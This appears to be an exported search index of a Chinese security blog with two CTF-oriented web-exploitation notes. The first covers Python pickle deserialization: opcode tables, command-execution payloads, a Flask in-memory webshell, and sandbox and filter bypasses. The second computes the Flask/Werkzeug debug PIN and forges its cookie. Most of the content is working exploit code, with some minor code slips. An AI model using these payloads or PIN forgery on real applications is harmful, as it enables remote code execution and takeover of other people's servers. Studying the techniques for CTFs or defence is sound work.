<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pickle反序列化</title>
    <url>/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="pickle模块常见方法及接口"><a href="#pickle模块常见方法及接口" class="headerlink" title="pickle模块常见方法及接口"></a>pickle模块常见方法及接口</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#序列化函数：</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#将打包好的对象 obj 写入文件中，其中protocol为pickling的协议版本（下同）</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#将 obj 打包以后的对象作为bytes类型直接返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化函数：</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line"><span class="comment">#从文件中读取二进制字节流，将其反序列化为一个对象并返回</span></span><br><span class="line">pickle.loads(data, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line"><span class="comment">#从data中读取二进制字节流，将其反序列化为一个对象并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常用方法：</span></span><br><span class="line"><span class="built_in">object</span>.__reduce__()</span><br><span class="line"><span class="comment">#可重写，Python要求该方法返回一个字符串或者元组。如果返回元组(callable, ([para1,para2...])[,...]) ，那么每当该类的对象被反序列化时，该callable就会被调用，参数为para1、para2...</span></span><br></pre></td></tr></table></figure>

<h1 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h1><table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">描述</th>
<th align="center">具体写法</th>
<th align="center">栈上的变化</th>
</tr>
</thead>
<tbody><tr>
<td align="center">c</td>
<td align="center">获取一个全局对象或import一个模块</td>
<td align="center">c[module]\n[instance]\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td align="center">o</td>
<td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td align="center">i[module]\n[callable]\n</td>
<td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">实例化一个None</td>
<td align="center">N</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">实例化一个字符串对象</td>
<td align="center">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">实例化一个UNICODE字符串对象</td>
<td align="center">Vxxx\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">实例化一个int对象</td>
<td align="center">Ixxx\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">实例化一个float对象</td>
<td align="center">Fx.x\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td align="center">R</td>
<td align="center">函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td align="center">.</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">(</td>
<td align="center">向栈中压入一个MARK标记</td>
<td align="center">(</td>
<td align="center">MARK标记入栈</td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td align="center">t</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="center">)</td>
<td align="center">向栈中直接压入一个空元组</td>
<td align="center">)</td>
<td align="center">空元组入栈</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td align="center">l</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="center">]</td>
<td align="center">向栈中直接压入一个空列表</td>
<td align="center">]</td>
<td align="center">空列表入栈</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td align="center">d</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="center">}</td>
<td align="center">向栈中直接压入一个空字典</td>
<td align="center">}</td>
<td align="center">空字典入栈</td>
</tr>
<tr>
<td align="center">p</td>
<td align="center">将栈顶对象储存至memo_n</td>
<td align="center">pn\n</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">g</td>
<td align="center">将memo_n的对象压栈</td>
<td align="center">gn\n</td>
<td align="center">对象被压栈</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">丢弃栈顶对象</td>
<td align="center">0</td>
<td align="center">栈顶对象被丢弃</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td align="center">b</td>
<td align="center">栈上第一个元素出栈</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td align="center">s</td>
<td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td align="center">u</td>
<td align="center">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td align="center">u</td>
<td align="center">MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">将栈的第一个元素append到第二个元素(列表)中</td>
<td align="center">a</td>
<td align="center">栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td align="center">e</td>
<td align="center">MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody></table>
<h1 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="重写reduce"><a href="#重写reduce" class="headerlink" title="重写reduce"></a>重写reduce</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">18</span></span><br><span class="line">        <span class="variable language_">self</span>.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line">    <span class="comment">#一般直接新建实例写个reduce就行，可以执行命令，import可以写在reduce里面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span>,)</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br></pre></td></tr></table></figure>

<p>内存马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">def__reduce__(<span class="variable language_">self</span>):</span><br><span class="line"><span class="keyword">return</span>(<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_clas</span></span><br><span class="line"><span class="string">s] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;</span>,))</span><br></pre></td></tr></table></figure>



<h3 id="手写opcode（可执行多个命令）"><a href="#手写opcode（可执行多个命令）" class="headerlink" title="手写opcode（可执行多个命令）"></a>手写opcode（可执行多个命令）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在pickle中，和函数执行的字节码有三个：R、i、o</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#R控制台输出</span></span><br><span class="line">opcode1=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#有回显</span></span><br><span class="line"><span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;subprocess&quot;).getoutput(&quot;open&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#i(相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）)</span></span><br><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#o(寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）)</span></span><br><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#相当于执行os.system(&#x27;whoami&#x27;),b&#x27;&#x27;&#x27;xxx&#x27;&#x27;&#x27;代表是字节串</span></span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><ul>
<li>条件：session或token是以明文的方式进行存储</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret=<span class="string">&quot;This is a key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+secret.secret)</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">fake=pickle.loads(opcode)</span><br><span class="line"><span class="comment">#d是构造字典，b是进行覆盖赋值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+fake.secret)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret变量的值为:This is a key</span></span><br><span class="line"><span class="comment">#secret变量的值为:Hack!!!</span></span><br></pre></td></tr></table></figure>

<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过RestrictedUnpickler限制-c、i、-x93"><a href="#绕过RestrictedUnpickler限制-c、i、-x93" class="headerlink" title="绕过RestrictedUnpickler限制(c、i、\x93)"></a>绕过RestrictedUnpickler限制(c<code>、</code>i<code>、</code>\x93)</h2><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#相当于执行builtins.getattr(builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.golbals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(__import__(&quot;os&quot;).system(&quot;whoami&quot;))</span></span><br><span class="line"><span class="comment">#getattr可以获取对象的属性值</span></span><br><span class="line"><span class="comment">#builtins模块中仍包含builtins模块，由于返回的结果是个字典，所以我们还需要获取get()函数</span></span><br><span class="line"><span class="comment">#builtins.dict.get(builtins.globals(), &#x27;builtins&#x27;)，获取builtins后再从中获取eval函数</span></span><br></pre></td></tr></table></figure>



<h3 id="导入使用pickle-loads"><a href="#导入使用pickle-loads" class="headerlink" title="导入使用pickle.loads()"></a>导入使用pickle.loads()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">bin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (pickle.loads,(<span class="string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">b=<span class="built_in">bin</span>()</span><br><span class="line"><span class="comment"># b=b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从builtins的全局变量中获得pickle模块，导入使用pickle.loads()，再构造需要使用的命令序列化后组合即可</span></span><br></pre></td></tr></table></figure>

<h2 id="绕过R指令"><a href="#绕过R指令" class="headerlink" title="绕过R指令"></a>绕过R指令</h2><h3 id="利用i，o"><a href="#利用i，o" class="headerlink" title="利用i，o"></a>利用i，o</h3><h3 id="利用b"><a href="#利用b" class="headerlink" title="利用b"></a>利用b</h3><ul>
<li>当PVM解析到<code>b</code>指令时执行<code>__setstate__</code>或者<code>__dict__.update()</code></li>
<li><code>当对象被序列化时调用</code><strong>getstate</strong><code>，被反序列化时调用</code><strong>setstate</strong><code>，可以重写</code><strong>setstate</strong>&#96;</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __setstate__&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.name=state</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">10</span></span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有__setstate__，b字节码相当于执行了__dict__.update</span></span><br><span class="line"><span class="comment">#若有__setstate__，b字节码相当于执行了__setstate__(传入的值)，即相当于执行了os.system(command)</span></span><br></pre></td></tr></table></figure>

<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="利用V指令进行Unicode绕过"><a href="#利用V指令进行Unicode绕过" class="headerlink" title="利用V指令进行Unicode绕过"></a>利用V指令进行Unicode绕过</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(Vsecr\u0065t</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用内置函数获取关键字"><a href="#利用内置函数获取关键字" class="headerlink" title="利用内置函数获取关键字"></a>利用内置函数获取关键字</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(next(reversed(dir(sys.modules[&#x27;admin&#x27;]))))</span></span><br><span class="line"><span class="comment">#对于已导入的模块，我们可以通过sys.modules[&#x27;xxx&#x27;]来获取该模块，然后通过内置函数dir()来列出模块中的所有属性</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>flask pin码计算</title>
    <url>/2025/06/22/flask%20pin%E7%A0%81%E8%AE%A1%E7%AE%97&amp;%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><ul>
<li>开启debug模式</li>
<li>生成cookie</li>
</ul>
<h1 id="生成条件"><a href="#生成条件" class="headerlink" title="生成条件"></a>生成条件</h1><ul>
<li>prbably_public_bits</li>
</ul>
<p>​	有如下四个变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username</span><br><span class="line">modname</span><br><span class="line">getattr(app, <span class="string">&#x27;name&#x27;</span>, app.class.name)</span><br><span class="line">getattr(mod, <span class="string">&#x27;file&#x27;</span>, None)</span><br><span class="line">-----------------------------------</span><br><span class="line">username：通过/etc/passwd这个文件去猜</span><br><span class="line">modname：getattr(app, <span class="string">&quot;module&quot;</span>, t.cast(object, app).class.module)获取，不同版本的获取方式不同，但默认值都是flask.app</span><br><span class="line">appname：通过getattr(app, <span class="string">&#x27;name&#x27;</span>, app.class.name)获取，默认值为Flask</span><br><span class="line">moddir：flask所在的路径，通过getattr(mod, <span class="string">&#x27;file&#x27;</span>, None)获得，题目中一般通过查看debug报错信息获得</span><br></pre></td></tr></table></figure>

<ul>
<li>private_bits</li>
</ul>
<p>​	有如下三个变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uuid</span><br><span class="line">machine-id</span><br><span class="line"> </span><br><span class="line">-----------------------------------</span><br><span class="line">uuid：</span><br><span class="line">网卡的mac地址的十进制，可以通过代码uuid.getnode()获得，也可以通过读取/sys/class/net/eth0/address获得，一般获取的是一串十六进制数，将其中的横杠去掉然后转十进制就行。</span><br><span class="line">例：00:16:3e:03:8f:39 =&gt; 95529701177</span><br><span class="line">也可以直接跑<span class="built_in">print</span>(int(<span class="string">&quot;00:16:3e:03:8f:39&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),16))</span><br><span class="line">machine-id：</span><br><span class="line">machine-id是通过**三个文件**里面的内容经过处理后拼接起来</span><br><span class="line"> </span><br><span class="line">1. /etc/machine-id（一般仅非docker机有，截取全文）</span><br><span class="line">2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）</span><br><span class="line">3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）</span><br><span class="line"><span class="comment"># 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope</span></span><br><span class="line"><span class="comment"># 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面</span></span><br><span class="line">文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。</span><br><span class="line">文件3如果存在的话就截取，不存在的话就不用管</span><br><span class="line">最后machine-id=（文件1或文件2）+文件3（存在的话）</span><br></pre></td></tr></table></figure>

<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="低版本（werkzeug1-0-x-MD5）"><a href="#低版本（werkzeug1-0-x-MD5）" class="headerlink" title="低版本（werkzeug1.0.x MD5）"></a>低版本（werkzeug1.0.x MD5）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment">#username，通过/etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#modname，默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment"># moddir，通过报错获得</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;25214234362297&#x27;</span>,  <span class="comment"># mac十进制值 /sys/class/net/ens0/address</span></span><br><span class="line">    <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>  <span class="comment"># 低版本直接/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

